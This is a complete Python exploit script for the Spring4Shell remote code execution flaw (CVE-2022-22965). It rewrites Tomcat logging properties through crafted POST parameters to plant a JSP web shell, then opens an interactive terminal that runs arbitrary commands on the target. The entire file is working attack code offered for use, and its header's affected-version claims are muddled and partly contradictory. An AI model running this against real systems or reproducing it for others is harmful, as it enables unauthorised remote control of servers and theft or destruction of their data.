#!/usr/bin/env python3
# exploit title: spring4shell
# author: p1ckzi
#         github: https://github.com/p1ckzi
#         twitter: @p1ckzi
# vendor home: https://spring.io/
# vulnerable software and version: before 4.8.28 and 5.x before 5.6.3.
# tested on: Ubuntu Linux 20.04.
# cve: CVE-2022-22965
#
# description:
# simple script that exploits a remote code execution vulnerability found in
# the java spring framework before version 5.2, as well as in versions
# 5.3.0-17 and 5.2.0-19 and running on a version of the Java Development Kit
# greater than or equal to 9.

import argparse
import bs4
import cmd
import errno
import re
import requests
import secrets
import sys
import time
import urllib.parse


def arguments():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=f"{sys.argv[0]} exploits an RCE vulnerability in"
        "\napplications running spring core java framework.",
        epilog=f"examples:"
        f"\n\t{sys.argv[0]} http://10.10.10.10/"
        f"\n\t{sys.argv[0]} http://hostname:8080/ -p 'password123'"
        f"\n\t{sys.argv[0]} http://10.10.10.10/subdir/ -a -f 'jsp-shell'"
    )
    parser.add_argument("address", help="ip/hostname, port, sub-directories"
                        " to the vulnerable spring core framework on tomcat")
    parser.add_argument("-f", "--filename", help="name of the file to create"
                        " and upload", default=filename())
    parser.add_argument("-p", "--password", help="password to protect the "
                        "uploaded shell", default=password())
    parser.add_argument("-d", "--directory", help="The upload path for the "
                        "file", default="webapps/ROOT")
    parser.add_argument("-a", "--accessible", help="turns off features"
                        " which may negatively affect screen readers",
                        action="store_true", default=False)
    parser.add_argument("-n", "--no-colour", help="removes colour output",
                        action="store_true", default=False)
    arguments.option = parser.parse_args()


# settings for terminal output defined by user in term_settings().
class settings():
    # colours.
    c0 = ""
    c1 = ""
    c2 = ""

    # information boxes.
    i1 = ""
    i2 = ""
    i3 = ""
    i4 = ""


# checks for terminal setting flags supplied by arguments().
def term_settings():
    if arguments.option.accessible:
        small_banner()
    elif arguments.option.no_colour:
        settings.i1 = "[+] "
        settings.i2 = "[!] "
        settings.i3 = "[i] "
        settings.i4 = "$ "
        banner()
    elif not arguments.option.accessible or arguments.option.no_colour:
        settings.c0 = "\u001b[0m"  # reset.
        settings.c1 = "\u001b[38;5;1m"   # red.
        settings.c2 = "\u001b[38;5;2m"   # green.
        settings.i1 = "[+] "
        settings.i2 = "[!] "
        settings.i3 = "[i] "
        settings.i4 = "$ "
        banner()
    else:
        print("something went horribly wrong!")
        sys.exit()


# default terminal banner.
def banner():
    print(
        f"{settings.c2}"
        "\n                /           /  |      /         / /"
        "\n ___  ___  ___    ___  ___ (___| ___ (___  ___ ( ( "
        "\n|___ |   )|   )| |   )|   )    )|___ |   )|___)| | "
        "\n __/ |__/ |    | |  / |__/    /  __/ |  / |__  | | "
        f"\n     |                __/{settings.c0}"
        "\nCVE-2022-22965."
    )


def small_banner():
    print(
        f"{sys.argv[0]}"
        "\nCVE-2022-22965."
    )


# appends a '/' if not supplied at the end of the address.
def address_check(address):
    check = re.search('/$', address)
    if check is not None:
        print('')
    else:
        arguments.option.address += "/"


# randomly generated if not supplied by user.
def filename():
    filename = secrets.token_hex(8)
    return filename


# randomly generated if not supplied by user.
def password():
    password = secrets.token_hex(4)
    return password


# retrieves the hostname/ip address to use for the prompt.
def get_host(address, with_scheme=False):
    host = urllib.parse.urlparse(address)
    return f"{host.scheme}://{host.netloc}" if with_scheme else host.netloc


class terminal(cmd.Cmd):
    def __init__(self, shell, *command):
        super().__init__(*command)
        self.prompt = (
            f"spring4shell:{exploit.user}@"
            f"{get_host(shell)} {settings.i4}"
            )
        self.shell = shell

    def default(self, command):
        try:
            command = command.strip()
            if command == "exit":
                exit()
            elif not command:
                return
            else:
                spring_shell = requests.get(
                    f"{self.shell}?cmd={command}",
                    verify=False,
                    timeout=30
                )
            if spring_shell.status_code == 404:
                print(
                    f"{settings.c1}{settings.i2}error while attempting "
                    f"to send command.{settings.c0}"
                )
            else:
                clean = filter(None, spring_shell.text.split("\n"))
                print("\n".join(list(clean)[:-1]))
        except requests.exceptions.Timeout:
            print(
                f"{settings.c1}{settings.i2}the request timed out "
                f"while attempting to execute command.{settings.c0}"
            )
        except requests.ConnectionError:
            print(
                f"{settings.c1}{settings.i2}could not connect "
                f"to {arguments.option.address}{settings.c0}"
            )
            sys.exit()


def exploit(address, filename, password, directory):
    post_header = {"Content-Type": "application/x-www-form-urlencoded"}
    get_header = {"prefix": "<%", "suffix": "%>//", "c": "Runtime"}

    log_pattern = (
        "class.module.classLoader.resources.context.parent."
        "pipeline.first.pattern=%25%7Bprefix%7Di%20"
        "java.io.InputStream%20in%20%3D%20%25%7Bc%7Di."
        "getRuntime().exec(request.getParameter(%22cmd%22))."
        "getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%"
        "5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B"
        "%20while((a%3Din.read(b))!%3D-1)%7B%20out."
        "println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di"
    )
    log_date = (
        "class.module.classLoader.resources.context."
        "parent.pipeline.first.fileDateFormat="
    )
    log_suffix = (
        "class.module.classLoader.resources."
        "context.parent.pipeline.first.suffix=.jsp"
    )
    log_dir = (
        "class.module.classLoader.resources.context."
        f"parent.pipeline.first.directory={directory}"
    )
    log_prefix = (
        "class.module.classLoader.resources.context."
        f"parent.pipeline.first.prefix={filename}"
    )
    file_date = (
        "class.module.classLoader.resources.context."
        "parent.pipeline.first.fileDateFormat=_"
    )
    pattern_data = (
        "class.module.classLoader.resources.context.parent."
        "pipeline.first.pattern="
    )

    all_data = "&".join([
        log_pattern,
        log_suffix,
        log_dir,
        log_prefix,
        log_date
    ])

    print(f"{settings.i3}attempting to change tomcat log variables.")

    # fileDateFormat is set and later reset, allowing the script to be run
    # more than once. cleanup may be required.
    reset = requests.post(
        address,
        headers=post_header,
        data=file_date,
        verify=False,
        timeout=30
    )
    if reset.status_code != 200:
        print(
            f"{settings.c1}{settings.i2}"
            f"cannot set log variables.{settings.c0}"
        )
    else:
        print(
            f"{settings.c2}{settings.i1}"
            f"log variables set successfully.{settings.c0}"
        )
    print(
        f"{settings.c2}{settings.i1}attempting to change tomcat log "
        f"location variables.{settings.c0}"
    )
    reset = requests.post(
        address,
        headers=post_header,
        data=all_data,
        verify=False,
        timeout=30
    )
    if reset.status_code != 200:
        print(
            f"{settings.c1}{settings.i2}the log configuration could "
            f"not be modified.{settings.c0}"
        )
        sys.exit(1)
    else:
        print(
            f"{settings.c2}{settings.i1}log successfully modified."
            f"{settings.c0}"
        )

    # waiting every so often - changes on server not always immediate.
    time.sleep(2)
    print(f"{settings.i3}waiting for tomcat changes.")
    time.sleep(2)
    print(f"{settings.i3}sending the webshell.")
    requests.get(address, headers=get_header, verify=False, timeout=30)
    time.sleep(2)

    # prevents future writes to the file.
    print(f"{settings.i3}resetting the log variables.")
    requests.post(
        address,
        headers=post_header,
        data=pattern_data,
        verify=False,
        timeout=30
    )
    time.sleep(5)
    get_user = requests.get(
        f"{address}{filename}.jsp?pwd={password}&cmd=whoami"
    )
    print(
        f"{settings.i3}shell location:"
        f"\n{settings.i3}{address}{filename}.jsp?pwd={password}&cmd=whoami"
        f"\n{settings.i3}or run commands here. type 'exit' to quit."
    )
    parse_user = str(bs4.BeautifulSoup(get_user.content, "html.parser"))
    exploit.user = parse_user.partition('\n')[0]
    return f"{get_host(address, with_scheme=True)}/{filename}.jsp"


def main():
    try:
        arguments()
        term_settings()
        address_check(arguments.option.address)
        shell = exploit(
            arguments.option.address,
            arguments.option.filename,
            arguments.option.password,
            arguments.option.directory
        )
        term = terminal(shell)
        term.cmdloop()
    except KeyboardInterrupt:
        print(f"\n{settings.i3}quitting.")
        sys.exit()
    except requests.exceptions.Timeout:
        print(
            f"{settings.c1}{settings.i2}the request timed out "
            f"while attempting to connect.{settings.c0}"
        )
        sys.exit()
    except requests.ConnectionError:
        print(
            f"{settings.c1}{settings.i2}could not connect "
            f"to {arguments.option.address}{settings.c0}"
        )
        sys.exit()
    except (
        requests.exceptions.MissingSchema,
        requests.exceptions.InvalidURL,
        requests.exceptions.InvalidSchema
    ):
        print(
            f"{settings.c1}{settings.i2}a valid schema and address "
            f"must be supplied.{settings.c0}"
        )
        sys.exit()


if __name__ == "__main__":
    main()
